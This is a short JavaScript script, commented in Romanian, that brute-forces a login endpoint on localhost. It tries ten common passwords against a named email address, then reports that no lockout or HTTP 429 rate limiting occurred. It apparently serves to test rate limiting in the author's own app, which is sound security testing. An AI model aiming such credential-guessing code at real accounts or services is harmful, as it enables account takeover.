const targetUrl = "http://localhost:3000/api/auth/login";

const targetEmail = "alex.agu@yahoo.com";

const passwordsToTry = [
  "123456", "password", "admin", "aaa", "qwerty",
  "test", "2026", "parola123", "nimic", "gresit10"
];

async function runBruteForce() {
  console.log(`Incepem atacul Brute Force pe: ${targetEmail}\n`);

  for (let i = 0; i < passwordsToTry.length; i++) {
    const pass = passwordsToTry[i];

    try {
      const response = await fetch(targetUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: targetEmail, password: pass })
      });

      const data = await response.json();

      // Afisam rezultatul fiecarei incercari
      console.log(`[Incercarea ${i + 1}] Parola: "${pass}" -> Status HTTP: ${response.status} | Raspuns: ${JSON.stringify(data)}`);

    } catch (err) {
      console.log(`Eroare la conectare: ${err.message}`);
    }
  }

  console.log("\nAtacul s-a terminat. Contul NU a fost blocat si nu am primit nicio eroare de tip 429.");
}

runBruteForce();